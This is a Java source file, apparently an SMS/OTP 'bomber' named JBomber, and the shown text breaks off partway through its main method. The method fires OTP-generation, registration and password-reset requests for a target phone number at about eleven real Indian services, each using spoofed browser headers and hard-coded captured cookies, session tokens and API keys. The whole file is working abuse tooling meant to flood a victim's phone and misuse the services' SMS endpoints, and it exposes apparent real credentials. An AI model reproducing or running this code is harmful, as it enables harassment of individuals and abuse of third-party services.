
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;

public class JBomber {
// Bomber function with api's
	private void bomber(String phone, int count) throws MalformedURLException, IOException {
		if (count == 1) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://rome.api.flipkart.com/api/7/user/otp/generate")
					.openConnection();
					
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("Connection", "keep-alive");
			con.setRequestProperty("Content-Length", "27");
			con.setRequestProperty("Content-Type", "application/json");
			con.setRequestProperty("Cookie",
					"T=TI159297634657200144109045966605626157746517396592054220256707454634; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18438%7CMCMID%7C05902867942550052795265142026569187314%7CMCAAMLH-1593581155%7C12%7CMCAAMB-1593581155%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1592983555s%7CNONE%7CMCAID%7CNONE; vh=619; dpr=1.5; vw=1280; gpv_pn=HomePage; gpv_pn_t=FLIPKART%3AHomePage; s_cc=true; S=d1t17Bj9wWT8nPz9uP2A/Pz8/B7o/mn9r7PJkcsr3muNeWPswtnQy5OZcGKNC7NDryxN/bbsyz93vp+bmSlIpb4vycA==; SN=VI31583A9BC8804E8AB1D5C5CD3865813A.TOKEAA4E002A992457995D9F0D4D6D5DD66.1593051883.LO; s_sq=%5B%5BB%5D%5D");
			con.setRequestProperty("Host", "rome.api.flipkart.com");
			con.setRequestProperty("Origin", "https://www.flipkart.com");
			con.setRequestProperty("Referer", "https://www.flipkart.com/");
			con.setRequestProperty("Sec-Fetch-Dest", "empty");
			con.setRequestProperty("Sec-Fetch-Mode", "cors");
			con.setRequestProperty("Sec-Fetch-Site", "same-site");
			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
			con.setRequestProperty("X-user-agent",
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 FKUA/website/42/website/Desktop");
			String jason = "{\"loginId\": \"+91" + phone + "\"" + ", \"supportAllStates\": true}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 2) {
			HttpURLConnection con = (HttpURLConnection) new URL(

					"https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, text/plain, */*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("Connection", "keep-alive");
			con.setRequestProperty("Content-Length", "86");
			con.setRequestProperty("Content-Type", "application/json");
			con.setRequestProperty("Host", "api.cloud.altbalaji.com");
			con.setRequestProperty("Origin", "https://www.altbalaji.com");
			con.setRequestProperty("Referer", "https://www.altbalaji.com/user-detail?pid=NTM%3D");
			con.setRequestProperty("Sec-Fetch-Dest", "empty");
			con.setRequestProperty("Sec-Fetch-Mode", "cors");
			con.setRequestProperty("Sec-Fetch-Site", "same-site");
			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
			con.setRequestProperty("X-API-KEY",
					"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IklCREdZMmtTTktnRnV1dVkifQ.eyJwaG9uZV9udW1iZXIiOiI5MDE1NTI0NjYzIiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTU5MzE0MTI3MzYxNH0.i7qsURYsW1TIEuD5t5tfm2ETwP05hec4MU62-F8-shs");
			String jason = "{\"phone_number\": \"" + phone + "\"" + ", \"country_code\": \"91\",\"platform\":\"web\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 3) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://apiv2.sonyliv.com/AGL/1.4/A/ENG/WEB/IN/CREATEOTP").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, text/plain, */*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("app_version", "3.0.9");
			con.setRequestProperty("Content-Length", "111");
			con.setRequestProperty("Content-Type", "application/json");
			con.setRequestProperty("device_id", "a21e57820882497e8bcd3e4607f1724a-1593056669995");
			con.setRequestProperty("Origin", "https://www.sonyliv.com");
			con.setRequestProperty("Referer", "https://www.sonyliv.com/signin");
			con.setRequestProperty("Sec-Fetch-Dest", "empty");
			con.setRequestProperty("Sec-Fetch-Mode", "cors");
			con.setRequestProperty("Sec-Fetch-Site", "same-site");
			con.setRequestProperty("security_token",
					"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1OTMwNTY1MDYsImV4cCI6MTU5NDM1MjUwNiwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.ScsiG15kuOiJ_kk0aXSUdkSie-hm41MpFtqrcA5JDbW3_G44KAzbTGBt-vVVUTA6DK3mLgG5axPV8v2IG5sDFzgtVlvZ7NnxFdwUo0pVEtOHrelFsq1Qi5MJiCOPwSqiRfijmzOfpmZFRP-OqASPEGNy1adioBByyc_7trtG4Y70xOqFuFQEIe6G9YptNwAFYwEIf4PJEJM582dgBZMYW9A-ywaFco5fRH65ZnPwohdQT8701NZLTujkQLY-gB5M3FJQu8fLrFH_cEs12gb_o2Ir94hE4nvzz7KVYy3h0n_dlD5yLPqqS2HKg4BeIwsOiTGNsSFgIJbP1kG9CZWcfKl2hUuhRbFh-4KqLqDrWg9EEtbtbevae8YMqdNK-ITklrXy2BEmfSDLLMp23XhwpW13bW9zHnQGx4W9nfoCt1yzo4ay_O7moE3BhKszZeT1-_AHEdq8ZJx16ZxU2YHnImgnbHYCUTWRWh95eYSpk5oYSaFEiYo2IzmXq7T5QmOhs2WK0sb9px9T6axKdjUchYqZ-0UXuo7hgganubTEE2cYj3sk1SPkXUNfoqQwIt6WtUVVcwxH6AUbtaAMQcqUeiKpF0TGwvfRRXtRpHHectZ3ghpGX-ohRqpew1HHCP2PxNHweW9mVdcHfY6SKyQUBkh_kSkt1xTBhlM0dn1S1Xk");
			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
			con.setRequestProperty("x-via-device", "true");
			String jason = "{\"channelPartnerID\": \"MSMIND\"" + ", \"mobileNumber\": \"" + phone
					+ "\",\"country\":\"IN\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 4) {
			HttpURLConnection con = (HttpURLConnection) new URL(

					"https://drive.olacabs.com/oauth/api/v2/web/auth/preauth").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, text/plain, */*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("Content-Length", "112");
			con.setRequestProperty("Content-Type", "application/json");
			con.setRequestProperty("Cookie",
					"_gcl_au=1.1.1065318012.1593079205; _ga=GA1.2.402015615.1593079210; _gid=GA1.2.263437067.1593079210; FB_PIXEL=1; G_ENABLED_IDPS=google; _gat_UA-20199135-16=1; _gat_UA-151183718-1=1");
			con.setRequestProperty("Origin", "https://drive.olacabs.com");
			con.setRequestProperty("Referer", "https://drive.olacabs.com/register");
			con.setRequestProperty("Sec-Fetch-Dest", "empty");
			con.setRequestProperty("Sec-Fetch-Mode", "cors");
			con.setRequestProperty("Sec-Fetch-Site", "same-site");
			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
			con.setRequestProperty("x-application-license-key", "d6ba8ca2d23c4f2aabace889d1d9a973");
			con.setRequestProperty("x-fp-key", "2c3c2d44-111e-4580-21d3-4c29a8f26a8a");
			con.setRequestProperty("x-request-key", "e6679e82-4fa9-961d-6e6c-c6a1ccf2edb8");
			String jason = "{\"auth_scheme\":\"OTP\",\"provider\":\"IMSSuvidhaAuth\",\"credential\":{\"dialingCode\":\"+91\",\"mobileNumber\":\""
					+ phone + "\"}}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 5) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://www.meru.in/register").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept",
					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("Cache-Control", "max-age=0");
			con.setRequestProperty("Connection", "keep-alive");
			con.setRequestProperty("Content-Length", "103");
			con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			con.setRequestProperty("Cookie",
					"ci_session=urm8al7efu4rd3nr5rchrl09p58k851n; _ga=GA1.2.973147151.1593080618; _gid=GA1.2.1562120840.1593080618; _gcl_au=1.1.615701157.1593080619; __utma=204192780.973147151.1593080618.1593080624.1593080624.1; __utmc=204192780; __utmz=204192780.1593080624.1.1.utmcsr=duckduckgo.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmt_UA-20397824-7=1; _fbp=fb.1.1593080625715.138009152; _gat_gtag_UA_20397824_7=1; mp_ba8d4c9fa6a43ea6b158a96799b8a38e_mixpanel=%7B%22distinct_id%22%3A%20%22172eb012998399-0b06b6f1e795f3-4353760-e1000-172eb0129992ca%22%2C%22%24device_id%22%3A%20%22172eb012998399-0b06b6f1e795f3-4353760-e1000-172eb0129992ca%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fduckduckgo.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22duckduckgo.com%22%2C%22__mps%22%3A%20%7B%22%24os%22%3A%20%22Windows%22%2C%22%24browser%22%3A%20%22Chrome%22%2C%22%24browser_version%22%3A%2083%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fduckduckgo.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22duckduckgo.com%22%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24search_engine%22%3A%20%22duckduckgo%22%7D; __utmb=204192780.20.9.1593080820180");
			con.setRequestProperty("Host", "www.meru.in");
			con.setRequestProperty("Origin", "https://www.meru.in");
			con.setRequestProperty("Referer", "https://www.meru.in/register");
			con.setRequestProperty("Sec-Fetch-Dest", "empty");
			con.setRequestProperty("Sec-Fetch-Mode", "cors");
			con.setRequestProperty("Sec-Fetch-Site", "same-site");
			con.setRequestProperty("Sec-Fetch-User", "?1");
			con.setRequestProperty("Upgrade-Insecure-Requests", "1");
			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
			String jason = "first_name=jason&last_name=bond&mobile_number=" + phone
					+ "&email=mrkha.n@ggail.com&password=asdAS@123";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 6) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://secure.yatra.com/social/common/yatra/sendMobileOTP").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, text/javascript, */*; q=0.01");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("Content-Length", "34");
			con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
			con.setRequestProperty("Cookie",
					"JSESSIONID=023B4989AF3BFF97F31F2AEF69ED4203; cnName=IN; bm_sz=568FE956812DDFD41D0F280803BFC61D~YAAQT/zUFz2Pjd9yAQAAb19F6whJYoATCS8mlbcn47116x3pbyeuulQVwOWNPPmYGtcho0eqbChC9KLHumgr25of6dyuFQ22AQStmJQLDiuiJVbkM1zDFKgHEEw0qlN2pF1YW6WWmSWvMnONh88K5bRQOSiFZoJg225Ccp7CzHsQ6oQZ6ukDmuU85fatR5A=; _abck=53771566D00E7C9659D5C9A1F0BA726B~0~YAAQT/zUF0+Pjd9yAQAA9mhF6wQ2fbkky7Lk3asiD7EyuXod1PHLFUAjKCKaaTDAO8pPFz2s7a09iO+6IexkukyCRTDZyJBhVtI6enUmdF1t7Eb+VMXe0bsuOedPkkcJvbvEFJauEJRJqbSO6Ez9+5eLENqZ1MBBbow5/GqpneiUhOQ1wuak3lBm89udpbx44s7qUL9y4IUZVuYyHrlDjgjil7sxkwYVsdpqOOrNqf3kJDaojyHjaLU7+KwPTPFNXfHRCHj1awbotK4P2k6x6Sz7cUNoaCmnT8TSQHVVPPgsCk2kgST9ZxLGEZ+8n1W/5a6giEDT~-1~-1~-1; _ga=GA1.2.1426752992.1593085095; _gid=GA1.2.462152268.1593085095; _gat=1; SessionVX=6cbe2a30-d100-4c9a-bed7-53a63b7e6c8b; currencyId=1; G_ENABLED_IDPS=google; __utma=39525803.1426752992.1593085095.1593085101.1593085101.1; __utmc=39525803; __utmz=39525803.1593085101.1.1.utmcsr=yatra.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmt=1; __utmb=39525803.1.10.1593085101; ak_time=1593085110; __utmli=login-continue-btn; ak_bmsc=12E3C7B85995E8CA34A497BC626F8D1917D4FC4F7B330000A38CF45E0F9F7751~plijbv+rl7rWD2u8NThmumvtGyfJadOrpJ7K6htXsNV6OTtDPk8BH2MuHS4eKELcSAtEksfpTskKzYkPi8BcSNW4hzFtM2k7J8XuZIYVVDiVq83jVpHyzvQwQ4pEczkMbHHNgiWYMrRSGMXA3uIaJ0oQAhibqLZJy1OfNzxn0WHuh//hrg0r8HUWFiFPTfYJmouGNRsdXOWiB0H1r8qqct8nKMnoKzFm97tQsF4XvMb72MDRkZiC13SZKvn+xkc5lp; bm_sv=62B567A46A77C7AC5BD893BD6648590A~Obd1m1TUMRjJB3l6YO0cnTdQHEx8fK/yIBHqG7+Z2s54Wv080VR0GjgTtcLSH2Ox9TlZmeJ9xIqSefpOGBGDIySlajuOpT3RSNn6THoJFv32daZ5sbpMe/rbtVrTXTJYVCA8LdQYOuSxOPThRA+CHEm6PSA7ouwP7ounpjdUf/M=");

			con.setRequestProperty("Origin", "https://secure.yatra.com");
			con.setRequestProperty("Referer", "https://secure.yatra.com/social/common/yatra/register");
			con.setRequestProperty("Sec-Fetch-Dest", "empty");
			con.setRequestProperty("Sec-Fetch-Mode", "cors");
			con.setRequestProperty("Sec-Fetch-Site", "same-origin");

			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
			con.setRequestProperty("x-requested-with", "XMLHttpRequest");
			String jason = "isdCode=91&mobileNumber=" + phone + "";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();

		}

		else if (count == 7) {
			HttpURLConnection con = (HttpURLConnection) new URL("Https://unacademy.com/api/v3/user/user_check/")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("authorization", "Bearer undefined");
			con.setRequestProperty("Content-Length", "107");
			con.setRequestProperty("Content-Type", "application/json");
			con.setRequestProperty("Cookie",
					"lux_uid=159308760345565896; _gcl_au=1.1.1173002197.1593087604; _ga=GA1.2.592934725.1593087604; _gid=GA1.2.827414708.1593087604; _fbp=fb.1.1593087606722.2134359082; _anonymous_id=N-49079; __adroll_fpc=2740174943c68d470dc1a88f9fa22689-1593087609019; afUserId=800bcca9-4c9f-44ba-ab5a-0eb1fc44d7a0-i; intercom-id-td2gtidw=f565b757-3c81-4978-b88a-0f972685d835; intercom-session-td2gtidw=; mp_535208d541f9b5935ef91a365b0439e1_mixpanel=%7B%22distinct_id%22%3A%20%22172eb6bb16ee-06db5c29943de2-4353760-e1000-172eb6bb16f370%22%2C%22%24device_id%22%3A%20%22172eb6bb16ee-06db5c29943de2-4353760-e1000-172eb6bb16f370%22%2C%22Platform%22%3A%20%22Desktop%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.thehindu.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.thehindu.com%22%7D; anonymous_session_id=eb6c7520-6e3b-4c45-8f9d-22f45a68c45f; _gat_UA-69016858-2=1; _gat=1; __ar_v4=WHXHWT6QLZBBXDJZHSS4CJ%3A20200625%3A2%7CDTXEUXSUF5CCXCRQVNU67Z%3A20200625%3A2%7CA7GRIEU2LNBUXDAYDPFXIX%3A20200625%3A2");
			con.setRequestProperty("Origin", "https://unacademy.com");
			con.setRequestProperty("Referer",
					"https://unacademy.com/upscsummit2020?is_retargeting=true&shortlink=1166737e&c=Brand_Hindu_UPSC_Summit&pid=Brand&af_click_lookback=30d");
			con.setRequestProperty("Sec-Fetch-Dest", "empty");
			con.setRequestProperty("Sec-Fetch-Mode", "cors");
			con.setRequestProperty("Sec-Fetch-Site", "same-origin");
			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
			String jason = "{\"phone\": \"" + phone
					+ "\", \"country_code\": \"IN\", \"otp_type\": 1, \"email\": \"\", \"send_otp\": true,\"is_un_teach_user\": false}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 8) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("Content-Length", "27");
			con.setRequestProperty("Content-Type", "application/json");
			con.setRequestProperty("Cookie",
					"_bb_locSrc=default; _bb_cid=1; _bb_hid=1723; _bb_vid=\"NDEwMDE4NzAyMw==\"; _bb_tc=0; _client_version=2301; _bb_aid=\"MzAwNDkxOTI2MA==\"; _bb_rdt=\"MzE0NDMwMjg0MA==.0\"; _bb_rd=6; _sp_van_encom_hid=1722; _sp_bike_hid=1720; sessionid=g59so3g1vv1ca6em5y2zg1hutal6z2ir; adb=0; _gcl_au=1.1.1783145492.1593090837; _fbp=fb.1.1593090837309.773434232; G_ENABLED_IDPS=google; csrftoken=3Y0rAM9bOxB62qrj7tKJeaV6pBo0W5yePkLjUwWyFSaYwmiT9aFAybz2WW03yUnP; _ga=GA1.2.1604196404.1593130336; _gid=GA1.2.880890465.1593130336; _gat_gtag_UA_27455376_1=1; RT=\"z=1&dm=bigbasket.com&si=rqac45ayxc&ss=kbvgnzs3&sl=1&tt=68p&ld=690&nu=d41d8cd98f00b204e9800998ecf8427e&cl=6wm\"; bigbasket.com=d253e2ad-950a-4dc8-9fdb-cceeb89551be; ts=\"2020-06-26 05:42:21.980\"");
			con.setRequestProperty("Origin", "https://www.bigbasket.com");
			con.setRequestProperty("Referer", "https://www.bigbasket.com/");
			con.setRequestProperty("Sec-Fetch-Dest", "empty");
			con.setRequestProperty("Sec-Fetch-Mode", "cors");
			con.setRequestProperty("Sec-Fetch-Site", "same-origin");
			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
			con.setRequestProperty("X-caller", "DVAR-SVC");
			con.setRequestProperty("X-channel", "BB-WEB");
			con.setRequestProperty("X-csrftoken", "3Y0rAM9bOxB62qrj7tKJeaV6pBo0W5yePkLjUwWyFSaYwmiT9aFAybz2WW03yUnP");
			String jason = "{\"identifier\":\"" + phone + "\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			}
			con.getResponseCode();
		}

		else if (count == 9) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://www.1mg.com/auth_api/v4/create_token")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/vnd.healthkartplus.v11+json");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("cache-control", "no-cache, no-store, must-revalidate");
			con.setRequestProperty("Content-Length", "67");
			con.setRequestProperty("Content-Type", "application/json");
			con.setRequestProperty("cookie",
					"__cfduid=d64e5266fb5c0aa364ea07e9068ff7bdd1593090222; VISITOR-ID=b8bf9b5d-8f05-40ea-c065-061a424cae6d_acce55_1593090222; city=New%20Delhi; abVisitorId=148998; abExperimentShow=false; _fbp=fb.1.1593090227195.854354967; geolocation=false; session=bNZlpWLs9rBe-SOl1_fkCg.LCwgtRcgRLs1pqb0i9xw8lUGkoX7n7GHYZqneG0LwCpFENDlFcQQNdqgaIDJ79cUogoWSABK0NnUFQtcceQjUrdqZpCTVtVJ-ICXMlGcRf3hLT45oJcSwnGXR5GK-K6esyVkSvSXXxYuS8rx2BB53Q.1593090226054.2592000000.W94B1E1bfOf5dNxGVNDaBdyQygrHAyq7vQumU0wxplg; rl_anonymous_id=%22ad3371b0-095e-463e-8164-a6320ba18bf9%22; rl_user_id=%22b8bf9b5d-8f05-40ea-c065-061a424cae6d_acce55_1593090222%22; rl_trait=%7B%22name%22%3A%22Guest%22%2C%22email%22%3A%22%22%2C%22city%22%3A%22New%20Delhi%22%7D; _gcl_au=1.1.1616461808.1593090228; __gads=ID=7f418fa030843fa4:T=1593090228:S=ALNI_MZ7yYYkcB_5715l0hOnCh2pyLYoPA; _ga=GA1.2.1527437441.1593090228; _gid=GA1.2.1353265751.1593090230; __zlcmid=ysjEiviy4oNeuJ; amoSessionId=4af2d5d2-a662-4611-8939-d0f0df0039a7; _csrf=u87g_oSwD6xTmMYZcEZqHDtJ; isLocaleRedirect=false; isLocaleUIChange=false; lt_synch_timestamp=1593132922082; _uetsid=e5f7ec8a-3ce5-d979-dd67-350c30f18f67; _uetvid=61e8ea42-192c-f308-5640-92e8b4607171; _nv_utm=173339004.1593090227.2.1.dXRtc3JjPWR1Y2tkdWNrZ298dXRtY2NuPShub3Qgc2V0KXx1dG1jbWQ9b3JnYW5pY3x1dG1jdHI9KG5vdCBwcm92aWRlZCl8dXRtY2N0PShub3Qgc2V0KXxnY2xpZD0obm90IHNldCk=; _nv_uid=173339004.1593090227.4ba2e2dd-c34f-430e-90a0-23874690f21c.1593090227.1593132925.2; AMP_TOKEN=%24NOT_FOUND; _dc_gtm_UA-21820217-6=1; _gat_UA-21820217-6=1");
			con.setRequestProperty("hkp-platform", "Healthkartplus-0.0.1-mobileweb");
			con.setRequestProperty("Origin", "https://www.1mg.com");
			con.setRequestProperty("pragma", "no-cache");
			con.setRequestProperty("Referer", "https://www.1mg.com/");
			con.setRequestProperty("Sec-Fetch-Dest", "empty");
			con.setRequestProperty("Sec-Fetch-Mode", "cors");
			con.setRequestProperty("Sec-Fetch-Site", "same-origin");
			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");

			String jason = "{\"number\":\"" + phone + "\",\"is_corporate_user\":false,\"is_doctor\":false}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 10) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://api.dominos.co.in/loginhandler/forgotpassword")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, text/plain, */*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("access-control-allow-headers", "*");
			con.setRequestProperty("access-control-allow-methods", "GET, POST, PATCH, PUT, DELETE, OPTIONS");
			con.setRequestProperty("access-control-allow-origin", "*");
			con.setRequestProperty("accesskeyid", "ASIAWMIT2NXA4JWIKPFO");
			con.setRequestProperty("api_key", "X24EZOH3IL");
			con.setRequestProperty("authtoken", "ASIAWMIT2NXA4JWIKPFO");
			con.setRequestProperty("client_type", "web-chrome");
			con.setRequestProperty("content-length", "52");
			con.setRequestProperty("content-type", "application/json");
			con.setRequestProperty("deliverytype", "D");
			con.setRequestProperty("isloggedin", "false");
			con.setRequestProperty("origin", "https://pizzaonline.dominos.co.in");
			con.setRequestProperty("referer", "https://pizzaonline.dominos.co.in/?");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-site");
			con.setRequestProperty("strict-transport-security", "max-age=1624690430137");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{lastName: \"\", mobile: \"" + phone + "\", firstName: \"\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 11) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://www.freshmenu.com/api/users/2427783/get_otp/" + phone + "").openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("GET");
			con.setRequestProperty("Accept",
					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("cache-control", "max-age=0");
			con.setRequestProperty("cookie",
					"fm-session=s%3As7X-vZ_jRo6GjIhUZDxjQOmV-DcGmg_N.GWmy9KLhvVi6iWo3GdNBZJRhtitzaQWTHA5Gz0pMHJk; fmShowExitIntentPopup=false; WZRK_G=b7c52fe5f82d4c85b684b69d5d77127f; _ga=GA1.2.1401037128.1593089667; _gid=GA1.2.1905881518.1593089667; _fbp=fb.1.1593089668065.1272286777; XSRF-TOKEN=pCWFFVn8-YaHOmiFUFI2xHgwmAecafhqMVbQ; _hjid=275a0aa0-a32e-4b93-a1a6-df7d70bb3529; _hjIncludedInSample=1; fmAlternativeEmailId=zahid05@droverpzq.com; fmAlternativePhoneNumber=9873125676; WZRK_S_886-89W-644Z=%7B%22p%22%3A1%2C%22s%22%3A1593137283%2C%22t%22%3A1593137408%7D; AWSALB=SFCluWjBcIQxjamsONNn/tH37dthRKuJKF198gHmO/0r737aJTlSgU4QUDLz1UCIPCaXfDzRa8R1+zyaDBJAJ4YY52xoDHBKP8m1sDNLZ6pI2+XxiokOx0IE4TO1; AWSALBCORS=SFCluWjBcIQxjamsONNn/tH37dthRKuJKF198gHmO/0r737aJTlSgU4QUDLz1UCIPCaXfDzRa8R1+zyaDBJAJ4YY52xoDHBKP8m1sDNLZ6pI2+XxiokOx0IE4TO1");
			con.setRequestProperty("if-none-match", "W/\"3d-621734cc\"");
			con.setRequestProperty("referer", "https://www.freshmenu.com/");
			con.setRequestProperty("sec-fetch-dest", "document");
			con.setRequestProperty("sec-fetch-mode", "naviagate");
			con.setRequestProperty("sec-fetch-site", "none");
